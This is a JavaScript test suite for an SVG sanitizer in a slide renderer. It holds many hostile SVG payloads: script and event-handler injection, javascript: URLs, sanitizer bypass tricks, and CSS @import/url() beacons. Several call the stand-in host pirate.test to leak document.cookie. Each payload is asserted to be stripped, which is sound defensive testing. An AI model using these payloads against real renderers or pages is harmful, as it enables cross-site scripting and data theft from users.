/**
 * Sanitizing the SVGs inlined into the HTML document.
 *
 * A kit is DATA — `kit/archive.mjs` says it in so many words: "nothing that is
 * installed will ever be executed" — and `.svg` is on its allowlist of
 * extensions. Yet the HTML renderer inlined logos, Lucide icons and Mermaid
 * diagrams just as they came: a `<script>` or an `onload=` inside a logo ran,
 * and the Obsidian plugin drops that HTML in by innerHTML, inside an Electron
 * renderer, with no CSP.
 *
 * The cases in this file are therefore HOSTILE SVGs, not malformed ones: each
 * is a known way around a naive sanitizer (mixed case, unquoted attribute,
 * entities inside the value, tag never closed). The last test compiles a real
 * hostile kit end to end — it is the one that proves all three inlining paths
 * really do go through here.
 */

import './setup.mjs'; // hermetic even under direct invocation (see setup.mjs)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { sanitizeSvg, compileHtml } from '../src/html/render.mjs';

/** What no output must ever contain. */
function assertHarmless(html, what = 'output') {
  assert.doesNotMatch(html, /<script/i, `${what}: script tag`);
  assert.doesNotMatch(html, /\son\w+\s*=/i, `${what}: event-handler attribute`);
  assert.doesNotMatch(html, /javascript:/i, `${what}: javascript: URL`);
  assert.doesNotMatch(html, /<foreignobject/i, `${what}: foreignObject`);
}

test('sanitizeSvg: script, foreignObject and their content disappear', () => {
  const out = sanitizeSvg(
    '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">' +
      '<script>fetch("//pirate.test/"+document.cookie)</script>' +
      '<foreignObject><body><img src=x onerror=alert(1)></body></foreignObject>' +
      '<circle r="5"/></svg>',
  );
  assertHarmless(out);
  assert.doesNotMatch(out, /pirate\.test/, 'the content of the dropped element goes with it');
  assert.match(out, /<circle r="5"\/>/, 'the legitimate drawing survives');
  assert.doesNotMatch(out, /<\?xml/, 'the XML prologue has no place in an HTML document');
});

test('sanitizeSvg: the ways around a naive replace do not get through', () => {
  const malicious = [
    '<svg><ScRiPt>alert(1)</ScRiPt></svg>', // mixed case
    '<svg onload=alert(1)><rect/></svg>', // unquoted attribute
    '<svg OnLoad = "alert(1)"><rect/></svg>', // case + spaces around the =
    '<svg><rect onmouseover=alert(1) fill="red"/></svg>',
    '<svg><a href="JaVaScRiPt&#58;alert(1)">x</a></svg>', // entity inside the value
    '<svg><a href="java\tscript:alert(1)">x</a></svg>', // noise the browser ignores
    '<svg><a xlink:href="javascript:alert(1)">x</a></svg>',
    '<svg><set attributeName="onload" to="alert(1)"/></svg>', // animation that writes the attribute
    '<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>',
    '<svg><script>var a = "</scr" + "ipt>";</script></svg>', // fake closing tag
    '<svg><rect a"onload="alert(1)" /></svg>', // fabricated attribute name
    '<svg><script src="https://pirate.test/x.js"/><circle/></svg>',
  ];
  for (const src of malicious) assertHarmless(sanitizeSvg(src), src);
});

test('sanitizeSvg: a `use` only points inside the document, never at the network', () => {
  const out = sanitizeSvg(
    '<svg><use href="https://pirate.test/x.svg#p"/><use href="#local"/></svg>',
  );
  assert.doesNotMatch(out, /pirate\.test/, 'an external use is a network request AND a DOM graft');
  assert.match(out, /<use href="#local"\/>/, 'the internal use — the only legitimate case — stays');
});

test('sanitizeSvg: legitimate SVG passes through intact (drawing, styles, name casing)', () => {
  const src =
    '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">' +
    '<linearGradient id="g"><stop offset="0" stop-color="#0B735F"/></linearGradient>' +
    '<clipPath id="c"><rect width="10" height="10"/></clipPath>' +
    '<style>.t{fill:url(#g)}</style>' +
    '<path class="t" d="M0 0L1 1" clip-path="url(#c)"/>' +
    '<text>Summer &amp; Co</text>' +
    '<a href="https://example.test">link</a>' +
    '<image href="data:image/png;base64,AAA"/>' +
    '</svg>';
  const out = sanitizeSvg(src);
  // SVG name casing is significant (linearGradient, clipPath, viewBox)
  for (const expected of [
    'viewBox="0 0 24 24"',
    '<linearGradient id="g">',
    '<clipPath id="c">',
    '<style>.t{fill:url(#g)}</style>',
    'd="M0 0L1 1"',
    'clip-path="url(#c)"',
    'Summer &amp; Co',
    'href="https://example.test"',
    'href="data:image/png;base64,AAA"',
  ]) {
    assert.ok(out.includes(expected), `"${expected}" lost to sanitizing:\n${out}`);
  }
});

test('sanitizeSvg: a data: image that is SVG is refused (it carries its own scripts)', () => {
  const out = sanitizeSvg(
    '<svg><image href="data:image/svg+xml,%3Csvg onload%3Dalert(1)%3E"/></svg>',
  );
  assert.doesNotMatch(out, /data:image\/svg/i);
});

// ---------------------------------------------------------------------------
// The network: a kit must not be able to get ANYTHING out
// ---------------------------------------------------------------------------
//
// Nothing that follows is code: these are stylesheets and URLs, which the
// extension allowlist lets through without a word to say against them. Yet an
// inlined SVG has no style scope of its own — its `<style>` is a GLOBAL sheet —
// and a remote `url()` leaves over the network at render time. An attribute
// selector plus a `url()` even read the DOM character by character. That is the
// risk class this whole file targets, with no `<script>` anywhere.

test('sanitizeSvg: a stylesheet that calls out to the network does not get through', () => {
  const malicious = [
    '<svg><style>html{background:url("//pirate.test/?leak=1")}</style></svg>', // no scheme
    '<svg><style>@import url("https://pirate.test/x.css");</style></svg>',
    '<svg><style>@import "https://pirate.test/x.css";</style></svg>', // @import without url()
    '<svg><style>@ImPoRt url(//pirate.test/x.css);</style></svg>', // mixed case
    '<svg><style>@\\69 mport url(//pirate.test/x.css);</style></svg>', // @import escaped in CSS
    '<svg><style>a{background:\\75 rl(//pirate.test/p)}</style></svg>', // url() escaped in CSS
    '<svg><style>a{background:url(/*x*/http://pirate.test/p)}</style></svg>', // comment inside the url()
    '<svg><style>@font-face{font-family:x;src:url(https://pirate.test/f.woff)}</style></svg>',
    '<svg><style>a{background:url(https://pirate.test/p}</style></svg>', // url() never closed
    // exfiltration: the selector picks, the url() reports back
    '<svg><style>input[value^="a"]{background:url(https://pirate.test/a)}</style></svg>',
  ];
  for (const src of malicious) {
    assert.doesNotMatch(sanitizeSvg(src), /pirate\.test/, `outbound stylesheet: ${src}`);
  }
});

test('sanitizeSvg: a remote url() outside `<style>` does not get through either', () => {
  const malicious = [
    // PRESENTATION attributes: they carry url() without being URL attributes
    '<svg><rect fill="url(//pirate.test/a.svg#g)"/></svg>',
    '<svg><rect filter="url(//pirate.test/f.svg#f)"/></svg>',
    '<svg><rect mask="url(https://pirate.test/m.svg#m)"/></svg>',
    '<svg><rect style="background:url(//pirate.test/b.png)"/></svg>', // style as an attribute
    '<svg><rect style="@import url(//pirate.test/x.css)"/></svg>',
  ];
  for (const src of malicious) {
    assert.doesNotMatch(sanitizeSvg(src), /pirate\.test/, `outbound url(): ${src}`);
  }
  // an internal url() — the only legitimate case — stays
  assert.match(
    sanitizeSvg('<svg><rect fill="url(#g)" clip-path="url(#c)"/></svg>'),
    /fill="url\(#g\)" clip-path="url\(#c\)"/,
  );
});

test('sanitizeSvg: a URL with no scheme still names a remote machine', () => {
  // `//host/x` has no scheme: the browser lends it the document's own.
  // It is a disguised absolute URL, and therefore a network tracking beacon.
  const malicious = [
    '<svg><image href="//pirate.test/pixel.png"/></svg>',
    '<svg><image HREF="//PIRATE.test/pixel.png"/></svg>', // mixed case
    '<svg><image href="&#47;&#47;pirate.test/pixel.png"/></svg>', // entities
    '<svg><image href="/\t/pirate.test/pixel.png"/></svg>', // tab in the middle
    '<svg><image href="/ /pirate.test/pixel.png"/></svg>', // space in the middle
    '<svg><image href="\\\\pirate.test/pixel.png"/></svg>', // the URL parser reads `\` as `/`
    '<svg><image href="\\/pirate.test/pixel.png"/></svg>',
  ];
  for (const src of malicious) {
    assert.doesNotMatch(sanitizeSvg(src), /pirate\.test/i, `URL with no scheme: ${src}`);
  }
  // a genuine relative URL is not a remote URL: it stays
  assert.match(sanitizeSvg('<svg><image href="logo.png"/></svg>'), /href="logo\.png"/);
});

// The DISGUISED form (`//pirate.test`) was blocked, the explicit one was not:
// `<image href="https://…">` went through intact and left AT RENDER TIME,
// without a single click. That is the fetch / navigation distinction in
// `svgUrlAllowed` — the hole came from no test ever having tried the scheme
// spelled out in full.
test('sanitizeSvg: a remote URL with an explicit scheme gets through no more than the rest', () => {
  const malicious = [];
  // the elements that LOAD their URL at render time, without interaction
  for (const el of ['image', 'feImage', 'filter', 'pattern', 'marker', 'linearGradient']) {
    for (const attr of ['href', 'xlink:href', 'HREF']) {
      for (const scheme of ['https', 'http']) {
        malicious.push(`<svg><${el} ${attr}="${scheme}://pirate.test/pixel.png?u=1"/></svg>`);
      }
    }
  }
  // and the already-known bypasses, with an explicit scheme this time
  malicious.push(
    '<svg><image href="HTTPS://PIRATE.test/pixel.png"/></svg>', // mixed case
    '<svg><image href="https&#58;//pirate.test/pixel.png"/></svg>', // entity in the scheme
    '<svg><image href="ht\ttps://pirate.test/pixel.png"/></svg>', // noise in the scheme
    '<svg><image href="https:\\\\pirate.test/pixel.png"/></svg>', // `\` read as `/`
    '<svg><use href="http://pirate.test/x.svg#p"/></svg>',
  );
  for (const src of malicious) {
    assert.doesNotMatch(
      sanitizeSvg(src),
      /pirate\.test/i,
      `remote URL loaded at render time: ${src}`,
    );
  }
});

test('sanitizeSvg: the clickable link does stay — it is only followed on a click', () => {
  const out = sanitizeSvg(
    '<svg><a href="https://example.test/a"><rect width="10"/></a>' +
      '<a xlink:href="http://example.test/b">b</a>' +
      '<a href="mailto:x@example.test">c</a></svg>',
  );
  for (const expected of [
    'href="https://example.test/a"',
    'xlink:href="http://example.test/b"',
    'href="mailto:x@example.test"',
  ]) {
    assert.ok(out.includes(expected), `"${expected}" lost: a link is not a request`);
  }
  // and the data: bitmap stays on `<image>`: it goes out to nowhere
  assert.match(
    sanitizeSvg('<svg><image href="data:image/png;base64,AAA"/></svg>'),
    /href="data:image\/png;base64,AAA"/,
  );
});

test('sanitizeSvg: on an `<a>`, only `href` navigates — `ping` is still a request', () => {
  // the `<a>` exemption bears on the PAIR element + attribute. `ping` sends a
  // POST off in the background to a host the reader sees nowhere; `src`,
  // `data`, `action` and `formaction` navigate no more than it does.
  for (const attr of ['ping', 'src', 'data', 'action', 'formaction']) {
    for (const scheme of ['http', 'https']) {
      const src = `<svg><a ${attr}="${scheme}://pirate.test/beacon" href="#local">t</a></svg>`;
      const out = sanitizeSvg(src);
      assert.doesNotMatch(out, /pirate\.test/i, `fetch URL kept on <a>: ${src}`);
      // and the legitimate link of the SAME `<a>` survives: we close off
      // fetching, not navigation
      assert.ok(out.includes('href="#local"'), `legitimate href lost with ${attr}: ${src}`);
    }
  }
});

test('sanitizeSvg: `<style>` closes at the first `</style`, whatever it contains', () => {
  // that is where the element ends, whether the parser sees text or markup in
  // its body: taking the body of a block avoids a gap between what we believe
  // we are reading and what the browser will read. (What it does with it
  // AFTERWARDS is the subject of the "sheet carrying markup" test.)
  const out = sanitizeSvg('<svg><style>/*</style>*/<script>alert(1)</script></svg>');
  assertHarmless(out, '`<script>` after a fake `</style>` close');
  // and Mermaid's legitimate sheet — where mmdc puts ALL of a diagram's
  // formatting — passes through without loss
  const mmd =
    '<svg><style>#mmd-1 .node rect{fill:#fff}#mmd-1 .edge{marker-end:url(#arrow)}</style></svg>';
  assert.match(sanitizeSvg(mmd), /#mmd-1 \.node rect\{fill:#fff\}/);
  assert.match(sanitizeSvg(mmd), /marker-end:url\(#arrow\)/);
});

// The body of a `<style>` is the only input re-emitted without being
// retokenized. Inside `<svg>` the parser reads it as MARKUP — there is no
// switch to RAWTEXT in foreign content — and `img` breaks out of foreign
// content: `<style><img src=x onerror=…>` produces a real HTML image that runs
// its handler, without any `<script>` appearing anywhere.
test('sanitizeSvg: a sheet carrying markup is refused wholesale', () => {
  const malicious = [
    '<svg><style>a{color:red}<img src=x onerror=alert(1)></style></svg>',
    '<svg><style>x{}<script>alert(1)</script></style></svg>',
    '<svg><style>a{}&lt;img src=x onerror=alert(1)&gt;</style></svg>', // `<` as an entity
    '<svg><style>/*z*/<img src=x onerror=alert(1)></style></svg>', // comment first
  ];
  for (const src of malicious) {
    const out = sanitizeSvg(src);
    assertHarmless(out, `sheet carrying markup: ${src}`);
    assert.doesNotMatch(out, /<style/i, `the offending sheet goes in its entirety: ${src}`);
  }
  // non-regression: a sheet that is nothing but CSS still passes through
  assert.match(
    sanitizeSvg('<svg><style>.t{fill:url(#g)}</style></svg>'),
    /<style>\.t\{fill:url\(#g\)\}<\/style>/,
  );
});

// ---------------------------------------------------------------------------
// End to end: a hostile kit really compiled
// ---------------------------------------------------------------------------

test('a kit whose logo is a hostile SVG puts nothing executable in the HTML', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lutrin-kit-hostile-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));

  // exactly what a .deckkit archive is allowed to contain: .json and .svg — the
  // extension allowlist has nothing to say against it
  fs.writeFileSync(path.join(dir, 'kit.json'), JSON.stringify({ name: 'kit-hostile' }));
  fs.writeFileSync(
    path.join(dir, 'theme.json'),
    JSON.stringify({
      name: 'Hostile Kit',
      logos: { coverSvg: './signature.svg', sectionSvg: './signature.svg' },
    }),
  );
  fs.writeFileSync(
    path.join(dir, 'signature.svg'),
    '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="100" height="20" ' +
      'onload="fetch(\'//pirate.test/?c=\'+document.cookie)">' +
      '<script>document.title="stolen"</script>' +
      '<foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject>' +
      '<a href="javascript:alert(1)"><rect width="100" height="20" fill="#0B735F"/></a>' +
      '</svg>',
  );

  const source = `---\nkit: ${dir}\n---\n\n# Cover\n\n## A section\n\n---\n\n# Content\n\ntext\n`;
  // fragment mode: the full document embeds OUR scripts (scaling, presenter
  // mode) and would drown the assertion — here we only want to see what the
  // kit brought in
  const { slides } = await compileHtml(source, { baseDir: dir, fragment: true });
  const html = slides.join('\n');

  assertHarmless(html, 'slides compiled from a hostile kit');
  assert.doesNotMatch(html, /pirate\.test/, 'not even the exfiltrating URL must survive');
  // the logo is still rendered: sanitizing is not discarding
  assert.match(html, /<rect width="100" height="20" fill="#0B735F"\/>/);
});

test('a kit whose logo is nothing but CSS sends out no request', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'lutrin-kit-css-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));

  fs.writeFileSync(path.join(dir, 'kit.json'), JSON.stringify({ name: 'kit-css' }));
  fs.writeFileSync(
    path.join(dir, 'theme.json'),
    JSON.stringify({
      name: 'CSS Kit',
      logos: { coverSvg: './signature.svg', sectionSvg: './signature.svg' },
    }),
  );
  // Not one line of script here: nothing but stylesheets and URLs, that is to
  // say exactly what a `.svg` is allowed to contain. Since an inlined SVG has
  // no style scope of its own, this `<style>` applies to the WHOLE document —
  // it repaints the deck, calls the network at render time, and reads the DOM
  // by attribute selector.
  fs.writeFileSync(
    path.join(dir, 'signature.svg'),
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="20">' +
      '<style>@import url("//pirate.test/x.css");' +
      '*{display:none !important} html{background:url("//pirate.test/?leak=1")}' +
      '[data-title^="a"]{background:url("//pirate.test/?c=a")}</style>' +
      // and the sheet read as markup: not a `<script>`, an `<img>` that breaks
      // out of foreign content taking its handler with it
      '<style>b{}<img src=x onerror="fetch(\'//pirate.test/?c=\'+document.cookie)"></style>' +
      '<image href="//pirate.test/pixel.png" width="1" height="1"/>' +
      '<rect width="100" height="20" fill="#0B735F" filter="url(//pirate.test/f.svg#f)"/>' +
      '</svg>',
  );

  const source = `---\nkit: ${dir}\n---\n\n# Cover\n\n## A section\n\n---\n\n# Content\n\ntext\n`;
  const { slides } = await compileHtml(source, { baseDir: dir, fragment: true });
  const html = slides.join('\n');

  assert.doesNotMatch(html, /pirate\.test/, 'no URL from the kit must reach the document');
  assert.doesNotMatch(html, /@import/i, 'an @import goes and fetches a document elsewhere');
  assert.doesNotMatch(html, /display:none *!important/, 'the outbound sheet goes in its entirety');
  // the drawing does stay — stripped of the one offending attribute
  assert.match(html, /<rect width="100" height="20" fill="#0B735F"\/>/);
});

// A presentation attribute is CSS, comments included: the browser strips them
// BEFORE tokenizing, so that `u/*z*/rl(…)` is a `url()` there that inspecting
// the raw text does not see. The sheet of a `<style>` was cleaned of its
// comments, the attributes were not.
test('sanitizeSvg: a CSS comment does not glue a url() back together in an attribute', () => {
  for (const payload of [
    '<svg><rect style="background:u/*z*/rl(http://pirate.test/p)" width="10"/></svg>',
    '<svg><rect style="background:url/*z*/(http://pirate.test/p)" width="10"/></svg>',
    '<svg><rect fill="ur/*z*/l(http://pirate.test/p)" width="10"/></svg>',
    '<svg><rect style="@im/*z*/port url(#a)" width="10"/></svg>',
  ]) {
    const out = sanitizeSvg(payload);
    assert.doesNotMatch(out, /pirate\.test/, `payload got through: ${payload}`);
    assert.doesNotMatch(out, /@import/i, `payload got through: ${payload}`);
    // only the offending attribute falls, the drawing stays
    assert.match(out, /<rect width="10"\/>/);
  }
  // non-regression: an innocuous comment does not condemn the attribute
  assert.match(
    sanitizeSvg('<svg><rect fill="url(#g)/*ok*/" width="10"/></svg>'),
    /fill="url\(#g\)/,
  );
});
